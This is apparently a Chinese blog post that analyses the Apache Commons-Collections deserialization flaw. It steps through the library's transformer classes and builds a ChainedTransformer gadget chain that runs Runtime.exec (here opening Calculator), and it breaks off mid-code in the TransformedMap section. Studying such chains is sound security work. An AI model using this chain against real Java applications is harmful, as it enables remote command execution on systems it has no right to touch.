class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，通过反射运行方法，需要三步：</p><ol><li>加载类。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.xx.xxx&quot;</span>);</span><br></pre></td></tr></table></figure></li><li>反射获取方法。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;methodName&quot;</span>);</span><br></pre></td></tr></table></figure></li><li>反射执行方法。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">method.invoke(clazz,args); <span class="comment">// clazz 执行静态方法。</span></span><br><span class="line">method.invoke(clazz.newInstance(),args);<span class="comment">// clazz的实例执行方法</span></span><br></pre></td></tr></table></figure>实际上，还有很多加载类、反射运行方法的方式，这里只介绍<code>Commons-Collections</code>的反序列化执行系统命令用到的反射机制。</li></ol><h1 id="CommonsCollections中存在的漏洞点"><a href="#CommonsCollections中存在的漏洞点" class="headerlink" title="CommonsCollections中存在的漏洞点"></a>CommonsCollections中存在的漏洞点</h1><p>漏洞点存在于</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/org/apache/commons/collections/functors/InvokerTransformer.java</span><br></pre></td></tr></table></figure><p>在<code>InvokerTransformer</code>类中的<code>transform</code>方法中使用了反射执行方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input to result by invoking a method on the input.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed result, null if null input</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">            </span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而观看这个类的构造函数:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that performs no validation.</span></span><br><span class="line"><span class="comment"> * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> methodName  the method to call</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> paramTypes  the constructor parameter types, not cloned</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args  the constructor arguments, not cloned</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现<code>IMethodName,iParamTypes,IArgs</code>均可控。那么现在只要保证<code>InvokerTransformer#transform(Object input)</code>中的input可以从外部传入，就能执行任意对象(<code>input</code>)的任意方法(<code>this.iMethodName</code>),且方法的参数(this.IArgs)可控。</p><p>但是现在还不能执行系统命令，因为执行系统命令的方式是<code>java.lang.RunTime.getRuntime().exec(&quot;XXX&quot;)</code>，需要连续反射执行两个方法(<code>getRunTime,exec</code>)，所以需要一个执行链，该执行链必须连续反射执行两个方法，且上次执行的结果(<code>getRunTime()</code>)，用来作为下次执行的输入<code>exec()</code>，达成下述代码形成的结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">rtClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.RunTime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> rtClazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> Class.froName(<span class="string">&quot;java.lang.RunTime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,String.Class)；</span><br><span class="line">execMethod.invoke(getRuntimeMethod.invoke(clazzRunTime),<span class="string">&quot;cmd&quot;</span>)</span><br></pre></td></tr></table></figure><p>恰好，<code>/org/apache/commons/collections/functors/ChainedTransformer</code>类中有合适的<code>transform</code>方法，该方法的参数是一个<code>iTransformers</code>类型的数组，并循环调用其数组中元素的<code>transform</code>方法。最重要的一点：一次循环的输出作为下次循环的输入。（链式调用）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，若只往<code>ChainedTransformer#transform()</code>方法传入<code>InvokerTransformer</code>的数组无法构建攻击链，因为攻击链的起点是<code>java.lang.RunTime</code>。无论怎么构建<code>InvokerTransformer</code>，都无法得到攻击链的开端<code>java.lang.RunTime</code>。你说巧不巧，又恰恰好又有一个类<code>ConstantTransformer</code>，看一下这个类的构造函数和<code>transformer</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that performs no validation.</span></span><br><span class="line"><span class="comment"> * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> constantToReturn  the constant to return each time</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input by ignoring it and returning the stored constant instead.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  the input object which is ignored</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the stored constant</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ConstantTransformer</code>的<code>transform</code>方法就直接返回其成员变量<code>this.iConstant</code>，且<code>this.iConstant</code>可以由构造参数传入。所以，如果实例化时传入的<code>this.iConstant</code>是<code>java.lang.Runtime.Class</code>，那么它的<code>transform</code>方法返回的就是<code>java.lang.RunTime.Class</code>。Perfect！</p><p>总结一下这几个<code>XXXXXTransformer</code>以及其构造函数和<code>transform</code>方法。</p><table><thead><tr><th>-</th><th><code>InvokerTransformer</code></th><th><code>ConstantTransformer</code></th><th><code>ChainedTransformer</code></th></tr></thead><tbody><tr><td>构造函数</td><td>接受三个参数</td><td>接受一个参数</td><td>接受一个<code>Transformer</code>类型的数组</td></tr><tr><td><code>transform</code>方法</td><td>通过反射可以执行一个对象的任意方法</td><td>返回构造函数传入的参数</td><td>执行<code>transformer</code>数组的每一个成员的<code>transform</code>方法</td></tr></tbody></table><p>OK，接下来终于可以构造攻击链了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer [] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(java.lang.Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator.app&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chain.transform(<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>攻击链拆解:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 模拟ConstantTransformer.transform, 返回Runtime.class;</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">inputClassRunTime</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="comment">// 模拟第一个InvokerTransformer，输入Runtime.class, 执行getMethod方法，返回getRuntime方法</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazzClass</span> <span class="operator">=</span> inputClassRunTime.getClass();</span><br><span class="line">            <span class="comment">// 反射获取getMethod方法，其参数类型为 String类型和Class[];</span></span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">methodGetMethod</span> <span class="operator">=</span> clazzClass.getMethod(<span class="string">&quot;getMethod&quot;</span>, String.class, Class[].class);</span><br><span class="line">            <span class="comment">// 执行getMethod方法，其参数为&quot;getRuntime&quot;, 这一步获取到getRuntime方法。</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">inputMethodGetRuntime</span> <span class="operator">=</span> methodGetMethod.invoke(inputClassRunTime,<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 模拟第二个InvokerTransformer，输入GetRuntime方法，执行invoke方法，返回Runtime对象。</span></span><br><span class="line">            <span class="comment">// getRuntime方法，是一个通过反射获取的方法，其所属的类为java.lang.reflect.Method</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazzMethod</span> <span class="operator">=</span> inputMethodGetRuntime.getClass();</span><br><span class="line">            <span class="comment">// 你说巧不巧，invoke方法自然可以用java.lang.reflect.Method.getMethod()获取到，其参数类型为Object,Object[]</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">methodInvoke</span> <span class="operator">=</span> clazzMethod.getMethod(<span class="string">&quot;invoke&quot;</span>,Object.class, Object[].class);</span><br><span class="line">            <span class="comment">// 通过invoke执行getRuntime方法，返回Runtime实例。</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">inputInstanceRuntime</span> <span class="operator">=</span> methodInvoke.invoke(inputMethodGetRuntime,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 模拟第三个InvokerTransformer，输入Runtime实例，执行exec方法，不用在意返回什么对象了。</span></span><br><span class="line">            <span class="comment">// Runtime实例对应的自然是Runtime类。</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazzRuntime</span> <span class="operator">=</span> inputInstanceRuntime.getClass();</span><br><span class="line">            <span class="comment">// 获取RunTime类的exec方法，其参数是String类型。</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">methodExec</span> <span class="operator">=</span> clazzRuntime.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">            <span class="comment">// 用Runtime的实例，执行exec方法，参数是命令。</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span>  <span class="operator">=</span> methodExec.invoke(inputInstanceRuntime,<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">            System.out.println(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><strong>至此</strong> ，漏洞的利用核心已经明了，构造一个<code>ChainedTransformer</code>对象，并调用其<code>transform</code>方法，则可以任意执行命令。</p><h1 id="TransformedMap-利用链"><a href="#TransformedMap-利用链" class="headerlink" title="TransformedMap 利用链"></a>TransformedMap 利用链</h1><p>根据一些参考资料，了解到<code>TransformedMap</code>中共有三种方法中调用了<code>transform</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//-----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms a key.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The transformer itself may throw an exception if necessary.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object  the object to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> the transformed object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (keyTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> keyTransformer.transform(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms a value.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The transformer itself may throw an exception if necessary.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object  the object to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> the transformed object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value  the value to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed value</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上，确认了<code>transformedMap</code>类中有三种方法调用了<code>transformedMap</code>方法，接下来需要确认调用<code>transfrom</code>方法的是<code>ChainedTranformer.transform()</code>，看一下<code>keyTransformer</code>和<code>valueTransfrom</code>的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** The transformer to use for the key */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line"><span class="comment">/** The transformer to use for the value */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br></pre></td></tr></table></figure><p>可以看到<code>keyTransformer</code>的类型是<code>Transformer</code>，且可以通过构造函数来控制。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//-----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If there are any elements already in the collection being decorated, they</span></span><br><span class="line"><span class="comment"> * are NOT transformed.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以，在构造poc时只需要将<code>keyTransformer</code>或<code>valueTransformer</code>赋值为上文构造的<code>ChainedTransformer</code>，然后再调用<code>TransfromerMap</code>的三个方法(<code>transformKey、transformValue、checkSetValue</code>)中的一个就可以触发<code>transform</code>方法。但是，上述三个方法是<code>protected</code>，不能被外部直接访问。<br>继续观察<code>TransformerMap</code>类中有四个<code>public</code>的方法.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Factory method to create a transforming map.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If there are any elements already in the map being decorated, they</span></span><br><span class="line"><span class="comment"> * are NOT transformed.</span></span><br><span class="line"><span class="comment"> * Constrast this with &#123;<span class="doctag">@link</span> #decorateTransform&#125;.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no transformation</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no transformation</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Factory method to create a transforming map that will transform</span></span><br><span class="line"><span class="comment"> * existing contents of the specified map.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If there are any elements already in the map being decorated, they</span></span><br><span class="line"><span class="comment"> * will be transformed by this method.</span></span><br><span class="line"><span class="comment"> * Constrast this with &#123;<span class="doctag">@link</span> #decorate&#125;.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no transformation</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no transformation</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorateTransform</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="type">TransformedMap</span> <span class="variable">decorated</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    <span class="keyword">if</span> (map.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformed</span> <span class="operator">=</span> decorated.transformMap(map);</span><br><span class="line">        decorated.clear();</span><br><span class="line">        decorated.getMap().putAll(transformed);  <span class="comment">// avoids double transformation</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> decorated;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = transformKey(key);</span><br><span class="line">    value = transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">putAll</span><span class="params">(Map 